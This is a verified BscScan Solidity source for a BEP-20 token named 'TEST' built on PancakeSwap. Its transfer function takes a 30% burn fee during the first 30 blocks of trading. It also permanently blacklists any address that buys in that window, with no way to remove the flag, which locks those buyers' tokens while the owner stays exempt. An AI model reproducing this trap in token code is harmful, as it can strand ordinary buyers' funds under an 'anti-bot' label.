/**
 *Submitted for verification at BscScan.com on 2022-09-25
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.16;

interface IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

library Address {
    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
}

interface IPancakeFactory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IPancakeRouter01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);

    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);

    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
}

interface IPancakeRouter02 is IPancakeRouter01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

     function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
}


///////////////////////////////////////Daruma///////////////////////////////////
contract DarumaToken is IERC20 {
   using SafeMath for uint256;
   using Address for address;

   mapping (address => uint256) internal _balanceof;
   mapping (address => mapping(address => uint256)) internal _allowance;
   mapping (address => bool) private isMarketPair;
   mapping (address => bool) private ExcloudAddress;
   mapping (address => bool) private BotAddress;
   
    string  internal _name;
    string  internal _symbol;
    uint8   internal _decimals;
    uint256 internal _totalSupply;

    IPancakeRouter02 internal Router;
    address private _owner;
    address private pair;
    uint256 private startblock;
    bool    private  _ismobility;

   
    modifier onlydev {require (msg.sender == _owner); _;}
    
    constructor() {  
       Router = IPancakeRouter02(0x10ED43C718714eb63d5aA57B78B54704E256024E );
       // 0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3  
       // 0x10ED43C718714eb63d5aA57B78B54704E256024E
       pair = IPancakeFactory(Router.factory()).createPair(address(this),address(Router.WETH()));
       _name = "TEST";
       _symbol = "TEST";
       _decimals = 9;
       _totalSupply = 100 *10**7 * 10**_decimals;  
       isMarketPair[address(pair)] = true;

       _owner = msg.sender;
       ExcloudAddress[_owner] = true;
       ExcloudAddress[address(this)] = true;
       _balanceof[msg.sender] = _totalSupply; //mint
       emit Transfer (address(0) ,msg.sender , _totalSupply);
    }

    function name() external override view returns (string memory) { return _name; }
    function symbol() external view override returns (string memory){ return _symbol; }
    function decimals() external view override returns (uint8){ return _decimals; }
    function totalSupply() public override view returns (uint256){  return _totalSupply; }
    function balanceOf(address account) override public view returns (uint256) {return _balanceof[account];}
    function Owner() external view returns(address) {return _owner;}
    function Pair() external view returns(address) {return pair;}
    function allowance(address owner, address spender) override external view returns (uint256){ return _allowance[owner][spender];}
    function isbot(address bot) external view returns(bool) { return BotAddress[bot];}
    function startBlock() external view returns(uint256) { return startblock;}

    //call
    function Renounce() external onlydev {_owner = address(0);}

    function approve(address spender, uint256 amount) override external returns (bool) {
        _approve(msg.sender,spender,amount);
        return true;
    }

    function _approve(address sender, address spender, uint256 amounts) private {
         require(sender != address(0), "ERC20: approve from the zero address");
         require(spender != address(0), "ERC20: approve to the zero address");
        _allowance[sender][spender] = amounts;
        emit Approval(sender, spender, amounts);
    }

     function transfer(address recipient, uint256 amount) override external returns (bool) {
        require(msg.sender != address(0));
        require(_balanceof[msg.sender] >= amount , "is not enough");
        _transfer(msg.sender, recipient , amount);
        return true;
    }
    
     function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool){
         _transfer(sender, recipient, amount);
         _approve(sender, msg.sender, _allowance[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    
    function _transfer(address from, address to , uint256 amount) internal returns(bool) {
         require(!BotAddress[from] && !BotAddress[to]);
        if(!_ismobility && isMarketPair[to]) {
            _ismobility = true;
            startblock = block.number;
        }
        if(!_ismobility) {
            return UNcost(from , to,amount);
        }
        if(_ismobility) {
            if(startblock.add(30) > block.number && !ExcloudAddress[from] && !ExcloudAddress[to]) {
                uint256 burnfee = amount.mul(30).div(100);
                uint256 shouldfee = amount.sub(burnfee);
                unchecked{_balanceof[from] = _balanceof[from] .sub(amount);}
                unchecked{_balanceof[to] = _balanceof[to] .add(shouldfee);}
                emit Transfer(from , to , shouldfee);
                unchecked{_balanceof[address(0)] = _balanceof[address(0)] .add(burnfee);}
                emit Transfer(from ,address(0) , burnfee);

                if(isMarketPair[from]) {
                    addBot(to);
                }

            } else {
               return UNcost(from , to,amount);
            }
        }
        return true;
    }

    function UNcost(address from , address to , uint256 amount) private returns(bool) {
        unchecked{_balanceof[from] = _balanceof[from] .sub(amount);}
        unchecked{_balanceof[to] = _balanceof[to] .add(amount);}
        emit Transfer(from , to , amount);
        return true;
    }

    function addBot(address bot) private  {
        BotAddress[bot] = true;
    }

}



 //////////////////////////////////END//////////////////////////////////////////////////